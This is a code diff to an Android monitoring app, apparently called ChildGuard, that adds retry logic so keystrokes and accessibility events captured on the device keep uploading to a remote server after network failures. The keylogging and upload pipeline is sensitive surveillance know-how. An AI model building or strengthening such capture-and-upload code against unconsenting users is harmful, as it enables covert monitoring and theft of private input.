@@ -49,6 +49,28 @@ class MonitorService : Service() {
         val eventQueue = ConcurrentLinkedQueue<JSONObject>()
         private const val MAX_QUEUE = 500
 
+        // Events that were drained for upload but could not be delivered.
+        // Server-side idempotency makes re-sending safe, so a dropped
+        // connection (mobile data / Tailscale blip) never loses evidence.
+        private val retryQueue = ConcurrentLinkedQueue<JSONObject>()
+        private const val MAX_RETRY = 1000
+
+        fun drainRetry(): List<JSONObject> {
+            val out = ArrayList<JSONObject>()
+            while (true) {
+                val e = retryQueue.poll() ?: break
+                out.add(e)
+            }
+            return out
+        }
+
+        fun requeue(items: List<JSONObject>) {
+            for (obj in items) {
+                while (retryQueue.size >= MAX_RETRY) retryQueue.poll()
+                retryQueue.add(obj)
+            }
+        }
+
         fun start() {
             isMonitoring = true
             isKeylogging = true
@@ -167,6 +189,9 @@ class MonitorService : Service() {
     private fun uploadQueuedEvents() {
         val merged = ArrayList<JSONObject>()
 
+        // Retried events go first so they are not starved by new traffic.
+        merged.addAll(drainRetry())
+
         // drain accessibility service queue
         while (ChildGuardAccessibilityService.eventQueue.isNotEmpty() && merged.size < MAX_BATCH) {
             ChildGuardAccessibilityService.eventQueue.poll()?.let { merged.add(it) }
@@ -185,7 +210,10 @@ class MonitorService : Service() {
 
         if (merged.isEmpty()) return
 
-        val childId = ensureRegistered() ?: return
+        val childId = ensureRegistered() ?: run {
+            requeue(merged)
+            return
+        }
 
         val sp = getSharedPreferences(ChildGuardApp.PREFS, MODE_PRIVATE)
         val serverUrl = sp.getString(ChildGuardApp.KEY_SERVER_URL, ChildGuardApp.DEFAULT_SERVER) ?: return
@@ -210,10 +238,12 @@ class MonitorService : Service() {
             val code = conn.responseCode
             conn.disconnect()
             if (code !in 200..299) {
-                Log.w(TAG, "upload rejected code=$code")
+                Log.w(TAG, "upload rejected code=$code; will retry")
+                requeue(merged)
             }
         } catch (e: Exception) {
-            Log.w(TAG, "upload error: ${e.message}")
+            Log.w(TAG, "upload error: ${e.message}; will retry")
+            requeue(merged)
         }
     }
 
